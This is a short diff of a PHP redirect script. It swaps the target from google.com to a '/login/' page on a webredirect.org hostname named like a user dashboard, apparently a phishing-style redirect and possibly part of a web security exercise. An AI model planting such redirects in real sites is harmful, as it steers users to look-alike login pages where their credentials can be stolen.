@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://google.com"); 
+header("Location: https://websec09userdashboard.webredirect.org/login/"); 
   
 exit; 
 ?> 
